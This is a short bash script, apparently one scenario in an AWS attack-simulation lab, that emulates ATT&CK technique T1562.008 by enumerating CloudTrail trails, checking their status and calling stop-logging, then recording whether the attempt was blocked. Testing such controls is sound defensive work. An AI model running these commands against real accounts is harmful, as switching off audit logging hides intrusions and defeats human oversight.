#!/usr/bin/env bash
# Scenario 2: Defense evasion by stopping CloudTrail logging
# ATT&CK: T1562.008
source "$(dirname "$0")/common.sh"

TRAIL="$(tf_out trail_name)"
use_identity ops

log "Step 1: Enumerate trails"
attempt cloudtrail describe-trails --query 'trailList[].Name' --output text || true

log "Step 2: Check whether ${TRAIL} is logging"
attempt cloudtrail get-trail-status --name "$TRAIL" --query IsLogging || true

log "Step 3: Stop logging"
if ! attempt cloudtrail stop-logging --name "$TRAIL"; then
  finish blocked
fi

STATUS="$(aws cloudtrail get-trail-status --name "$TRAIL" --query IsLogging --output text 2>/dev/null || echo unknown)"
log "Trail IsLogging is now: ${STATUS}"
warn "Restore with: scripts/reset.sh (re-applies enable_logging = true)"

if [[ "$STATUS" == "False" || "$STATUS" == "false" ]]; then
  finish succeeded
fi
warn "StopLogging returned success but status is '${STATUS}'. Treating as succeeded."
finish succeeded
